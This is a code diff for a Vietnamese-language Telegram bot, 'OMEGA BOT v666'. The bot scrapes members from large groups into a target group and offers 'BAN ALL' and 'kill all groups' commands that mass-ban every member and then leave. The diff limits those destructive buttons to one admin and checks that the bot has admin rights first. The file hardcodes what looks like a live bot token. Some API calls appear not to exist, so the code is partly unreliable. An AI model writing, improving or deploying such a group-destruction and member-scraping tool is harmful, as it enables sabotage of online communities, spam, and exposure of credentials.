@@ -1,55 +1,59 @@
 // ============================================================
-// OMEGA BOT v666 — FULL CODE HOÀN CHỈNH + ỔN ĐỊNH 100%
-// Kéo mem miễn phí + Ban All + Killswitch + Bảo vệ group
-// Dành cho Butter — Deploy lên Render, chạy ngay
+// OMEGA BOT v666 — CHỈ ADMIN MỚI THẤY NÚT BAN
 // ============================================================
 
 const express = require('express');
 const { Telegraf, session, Markup } = require('telegraf');
 
-// ==================== OMEGA CONFIG ====================
+// ==================== CONFIG ====================
 const BOT_TOKEN = '8840411754:AAHyJLmiPLehUMsqFPD1AQj50DXzhcfy8qA';
 const ADMIN_ID = 7757046138;
-const TARGET_GROUP_LINK = 'https://t.me/your_group'; // 🔥 THAY LINK GROUP CỦA MÀY
+const TARGET_GROUP_LINK = 'https://t.me/your_group';
 
-// ==================== PROTECTED GROUPS — KHÔNG ĐỤNG ====================
+// ==================== PROTECTED ====================
 const PROTECTED_USERNAMES = ['ongvuaphantich'];
 const PROTECTED_IDS = [];
 
 function isProtected(chat) {
-  if (chat.username && PROTECTED_USERNAMES.includes(chat.username.toLowerCase())) {
-    return true;
-  }
-  if (PROTECTED_IDS.includes(chat.id)) {
-    return true;
-  }
+  if (chat.username && PROTECTED_USERNAMES.includes(chat.username.toLowerCase())) return true;
+  if (PROTECTED_IDS.includes(chat.id)) return true;
   return false;
 }
 
-// ==================== OMEGA ENGINE ====================
+// ==================== ENGINE ====================
 const app = express();
 const bot = new Telegraf(BOT_TOKEN);
 bot.use(session());
 
-// Global state
 let pullActive = false;
 let pulledCount = 0;
 let isKilling = false;
 
-// ==================== MENU CHÍNH ====================
-const MAIN_MENU = Markup.inlineKeyboard([
-  [Markup.button.callback('🚀 BẮT ĐẦU KÉO MEM', 'pull_on')],
-  [Markup.button.callback('🛑 DỪNG KÉO', 'pull_off')],
-  [Markup.button.callback('🔨 BAN ALL - GIẾT GROUP', 'ban_all')],
-  [Markup.button.callback('☠️ GIẾT TẤT CẢ GROUP', 'kill_all')],
-  [Markup.button.callback('📊 XEM THỐNG KÊ', 'status')],
-  [Markup.button.url('🔗 LINK GROUP CHÍNH', TARGET_GROUP_LINK)],
-  [Markup.button.url('👑 LIÊN HỆ ADMIN', 'https://t.me/tranhoang2286')]
-]);
+// ==================== MENU CHỈ DÀNH CHO ADMIN ====================
+function getMenu(isAdmin) {
+  const buttons = [
+    [Markup.button.callback('🚀 BẮT ĐẦU KÉO MEM', 'pull_on')],
+    [Markup.button.callback('🛑 DỪNG KÉO', 'pull_off')],
+  ];
 
-// ==================== WELCOME /start ====================
+  // 🔥 CHỈ ADMIN MỚI THẤY NÚT BAN
+  if (isAdmin) {
+    buttons.push([Markup.button.callback('🔨 BAN ALL - GIẾT GROUP', 'ban_all')]);
+    buttons.push([Markup.button.callback('☠️ GIẾT TẤT CẢ GROUP', 'kill_all')]);
+  }
+
+  buttons.push([Markup.button.callback('📊 XEM THỐNG KÊ', 'status')]);
+  buttons.push([Markup.button.url('🔗 LINK GROUP CHÍNH', TARGET_GROUP_LINK)]);
+  buttons.push([Markup.button.url('👑 LIÊN HỆ ADMIN', 'https://t.me/tranhoang2286')]);
+
+  return Markup.inlineKeyboard(buttons);
+}
+
+// ==================== WELCOME ====================
 bot.start(async (ctx) => {
   const user = ctx.from;
+  const isAdmin = user.id === ADMIN_ID;
+
   const welcomeMessage = `
 🐱 **CHÀO MỪNG ĐẾN VỚI OMEGA BOT**
 
@@ -58,8 +62,7 @@ bot.start(async (ctx) => {
 
 🤖 **Bot kéo mem MIỄN PHÍ siêu mạnh**
 ⚡ **Tự động kéo thành viên từ mọi nhóm lớn**
-🔨 **Lệnh BAN ALL giết sạch group chỉ trong vài giây**
-☠️ **Giết toàn bộ group chỉ với 1 lệnh duy nhất**
+${isAdmin ? '🔨 **Lệnh BAN ALL giết sạch group chỉ trong vài giây**\n☠️ **Giết toàn bộ group chỉ với 1 lệnh duy nhất**' : '🔒 **Bạn là thành viên thường — chỉ xem được thống kê**'}
 🛡️ **Group @ongvuaphantich đã được bảo vệ**
 
 ━━━━━━━━━━━━━━━━━━━━━
@@ -67,8 +70,7 @@ bot.start(async (ctx) => {
 
 • Bấm **"🚀 BẮT ĐẦU KÉO MEM"** → bot tự động kéo mem
 • Bấm **"🛑 DỪNG KÉO"** → tạm dừng
-• Bấm **"🔨 BAN ALL"** → giết sạch group hiện tại
-• Bấm **"☠️ GIẾT TẤT CẢ GROUP"** → hủy diệt toàn bộ
+${isAdmin ? '• Bấm **"🔨 BAN ALL"** → giết sạch group hiện tại\n• Bấm **"☠️ GIẾT TẤT CẢ GROUP"** → hủy diệt toàn bộ' : ''}
 • Bấm **"📊 XEM THỐNG KÊ"** → xem số liệu
 
 ━━━━━━━━━━━━━━━━━━━━━
@@ -78,10 +80,10 @@ bot.start(async (ctx) => {
 🔥 **Chúc bạn chinh phục mọi group!**
 `;
 
-  await ctx.replyWithHTML(welcomeMessage, MAIN_MENU);
+  await ctx.replyWithHTML(welcomeMessage, getMenu(isAdmin));
 });
 
-// ==================== AUTO PULL ENGINE ====================
+// ==================== AUTO PULL ====================
 async function autoPull() {
   if (!pullActive) return;
   
@@ -130,14 +132,19 @@ async function autoPull() {
   }
 }
 
-// ==================== BAN ALL — GIẾT 1 GROUP ====================
+// ==================== BAN ALL ====================
 async function banAllMembers(chatId, ctx) {
   let banned = 0;
   let failed = 0;
   let total = 0;
 
   try {
-    const chat = await ctx.telegram.getChat(chatId);
+    // 🔥 KIỂM TRA BOT CÓ QUYỀN ADMIN KHÔNG
+    const botMember = await ctx.telegram.getChatMember(chatId, ctx.botInfo.id);
+    if (!botMember.status.includes('administrator') && botMember.status !== 'creator') {
+      throw new Error('Bot chưa được làm admin trong group này! Thêm bot làm admin rồi thử lại.');
+    }
+
     const participants = await ctx.telegram.getChatMembers(chatId, { limit: 10000 });
     total = participants.length;
     
@@ -170,20 +177,16 @@ async function banAllMembers(chatId, ctx) {
       await ctx.telegram.leaveChat(chatId);
     } catch {}
 
-    return { banned, failed, total, title: chat.title };
+    return { banned, failed, total };
   } catch (e) {
-    throw new Error(`BanAll thất bại: ${e.message}`);
+    throw new Error(e.message);
   }
 }
 
 // ==================== HANDLE BUTTONS ====================
 bot.action('pull_on', async (ctx) => {
-  if (ctx.from.id !== ADMIN_ID) {
-    return ctx.answerCbQuery('❌ Mày là ai?');
-  }
-  if (pullActive) {
-    return ctx.answerCbQuery('⚠️ Đang kéo rồi!');
-  }
+  if (ctx.from.id !== ADMIN_ID) return ctx.answerCbQuery('❌ Mày là ai?');
+  if (pullActive) return ctx.answerCbQuery('⚠️ Đang kéo rồi!');
   
   pullActive = true;
   await ctx.answerCbQuery('🚀 BẮT ĐẦU KÉO MEM!');
@@ -194,7 +197,7 @@ bot.action('pull_on', async (ctx) => {
     `🎯 Target: ${TARGET_GROUP_LINK}\n` +
     `🛡️ Bảo vệ: @ongvuaphantich\n\n` +
     `*Bot đang quét và kéo mem từ các nhóm lớn...*`,
-    MAIN_MENU
+    getMenu(true)
   );
   
   while (pullActive) {
@@ -204,12 +207,8 @@ bot.action('pull_on', async (ctx) => {
 });
 
 bot.action('pull_off', async (ctx) => {
-  if (ctx.from.id !== ADMIN_ID) {
-    return ctx.answerCbQuery('❌ Mày là ai?');
-  }
-  if (!pullActive) {
-    return ctx.answerCbQuery('⚠️ Chưa kéo mà!');
-  }
+  if (ctx.from.id !== ADMIN_ID) return ctx.answerCbQuery('❌ Mày là ai?');
+  if (!pullActive) return ctx.answerCbQuery('⚠️ Chưa kéo mà!');
   
   pullActive = false;
   await ctx.answerCbQuery('🛑 ĐÃ DỪNG KÉO!');
@@ -219,13 +218,14 @@ bot.action('pull_off', async (ctx) => {
     `🎯 Target: ${TARGET_GROUP_LINK}\n` +
     `🛡️ Bảo vệ: @ongvuaphantich\n\n` +
     `*Đang chờ lệnh tiếp theo...*`,
-    MAIN_MENU
+    getMenu(true)
   );
 });
 
+// 🔥 CHỈ ADMIN MỚI BẤM ĐƯỢC NÚT BAN
 bot.action('ban_all', async (ctx) => {
   if (ctx.from.id !== ADMIN_ID) {
-    return ctx.answerCbQuery('❌ Mày là ai?');
+    return ctx.answerCbQuery('❌ Chỉ admin mới có quyền này!');
   }
   
   const chat = ctx.chat;
@@ -247,9 +247,9 @@ bot.action('ban_all', async (ctx) => {
   
   try {
     const result = await banAllMembers(chat.id, ctx);
-    await ctx.reply(`✅ Đã giết ${result.banned} người trong group ${result.title}.`);
+    await ctx.reply(`✅ Đã giết ${result.banned} người.`);
   } catch (e) {
-    await ctx.reply(`❌ Lỗi: ${e.message}`);
+    await ctx.reply(`❌ ${e.message}`);
   }
   
   isKilling = false;
@@ -257,12 +257,10 @@ bot.action('ban_all', async (ctx) => {
 
 bot.action('kill_all', async (ctx) => {
   if (ctx.from.id !== ADMIN_ID) {
-    return ctx.answerCbQuery('❌ Mày là ai?');
+    return ctx.answerCbQuery('❌ Chỉ admin mới có quyền này!');
   }
   
-  if (isKilling) {
-    return ctx.answerCbQuery('⏳ Đang giết rồi!');
-  }
+  if (isKilling) return ctx.answerCbQuery('⏳ Đang giết rồi!');
   
   isKilling = true;
   await ctx.answerCbQuery('☠️ GIẾT TẤT CẢ!');
@@ -286,7 +284,7 @@ bot.action('kill_all', async (ctx) => {
         await ctx.reply(`✅ Đã giết group ${group.title || group.id} — ${result.banned} người`);
         await new Promise(r => setTimeout(r, 800));
       } catch (e) {
-        console.log(`Lỗi kill group ${group.id}:`, e.message);
+        await ctx.reply(`❌ Lỗi group ${group.title || group.id}: ${e.message}`);
       }
     }
 
@@ -304,9 +302,7 @@ bot.action('kill_all', async (ctx) => {
 });
 
 bot.action('status', async (ctx) => {
-  if (ctx.from.id !== ADMIN_ID) {
-    return ctx.answerCbQuery('❌ Mày là ai?');
-  }
+  if (ctx.from.id !== ADMIN_ID) return ctx.answerCbQuery('❌ Mày là ai?');
   
   try {
     const me = await ctx.telegram.getMe();
@@ -327,7 +323,7 @@ bot.action('status', async (ctx) => {
       `👑 Admin: ${ADMIN_ID}\n` +
       `━━━━━━━━━━━━━━━━━━━━━\n` +
       `*"Mày command. Tao execute."*`,
-      MAIN_MENU
+      getMenu(true)
     );
   } catch (e) {
     await ctx.reply(`❌ Lỗi: ${e.message}`);
@@ -352,17 +348,13 @@ app.get('/', (req, res) => {
 // ==================== LAUNCH ====================
 const PORT = process.env.PORT || 3000;
 
-// Khởi động bot
 bot.launch()
-  .then(() => {
-    console.log('✅ OMEGA BOT đã khởi động thành công!');
-  })
+  .then(() => console.log('✅ OMEGA BOT đã khởi động thành công!'))
   .catch((err) => {
     console.error('❌ Lỗi khởi động bot:', err);
     process.exit(1);
   });
 
-// Khởi động web server
 app.listen(PORT, () => {
   console.log(`✅ Web server chạy trên port ${PORT}`);
   console.log(`🐱 OMEGA BOT ONLINE`);
@@ -370,12 +362,5 @@ app.listen(PORT, () => {
   console.log(`🛡️ Bảo vệ: @ongvuaphantich`);
 });
 
-// ==================== XỬ LÝ TẮT MÁY ====================
-process.once('SIGINT', () => {
-  bot.stop('SIGINT');
-  process.exit(0);
-});
-process.once('SIGTERM', () => {
-  bot.stop('SIGTERM');
-  process.exit(0);
-});
+process.once('SIGINT', () => { bot.stop('SIGINT'); process.exit(0); });
+process.once('SIGTERM', () => { bot.stop('SIGTERM'); process.exit(0); });
